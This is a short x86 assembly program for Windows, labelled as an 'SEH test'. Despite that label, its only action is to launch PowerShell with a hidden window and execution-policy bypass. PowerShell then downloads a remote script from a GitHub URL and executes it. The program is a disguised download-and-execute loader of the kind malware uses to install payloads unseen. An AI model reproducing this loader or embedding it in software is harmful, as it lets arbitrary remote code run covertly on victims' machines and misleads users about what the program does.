.386
.model flat,stdcall
option casemap:none

include		windows.inc
include 	user32.inc
include 	kernel32.inc
includelib	user32.lib
includelib	kernel32.lib

.data
szCmd		db	"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass IEX (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Voraka/Stape/master/startpage.ps1');",0
szCap		db	'SEH test',0
szOK		db	'No SEH Found',0
lpStartinfo	dw 	0
stStartUp		STARTUPINFO		<?>
psInfo          PROCESS_INFORMATION      <?>

.code

_start:
      	;invoke  CreateProcess, ADDR szFileName, NULL, NULL, NULL, FALSE, 0, 0, 0, ADDR stStartUp, ADDR psInfo	
	invoke	CreateProcess,NULL,addr szCmd,NULL,NULL,NULL,NULL,NULL,NULL,addr stStartUp,addr psInfo
	invoke 	ExitProcess,NULL
		
end 	_start
		
